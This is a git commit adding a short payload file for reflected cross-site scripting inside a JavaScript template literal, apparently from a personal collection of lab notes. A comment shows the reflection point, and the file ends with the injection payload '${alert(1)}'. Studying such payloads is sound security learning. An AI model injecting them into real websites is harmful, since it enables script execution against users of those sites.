4ba0b15122895940768c51dbfa9545ae4f6022d0
senior <jedi>
2023-06-16 17:36:07 +0530

    ref xss js template literal

---
+++ XSS/Reflected XSS in template literal angle brackets, single, double quotes, backslash backticks Unicode-escaped/payload.js
@@ -0,0 +1,11 @@
+//unicode escaped characters < > ' " \ `
+/* point of reflection
+
+<script>
+    var message = `5 search results for 'hi'`;
+    document.getElementById('searchMessage').innerText = message;
+</script>
+
+*/
+
+${alert(1)}
